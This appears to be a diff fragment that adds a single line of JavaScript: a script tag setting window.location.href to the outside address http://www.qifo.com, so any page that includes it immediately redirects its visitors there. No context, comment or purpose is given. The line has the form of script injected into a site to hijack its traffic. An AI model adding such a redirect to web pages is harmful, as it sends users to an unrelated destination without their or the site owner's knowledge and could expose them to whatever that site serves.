@@ -1,0 +1,1 @@
+<script language=JavaScript>{window.location.href='http://www.qifo.com'}</script>
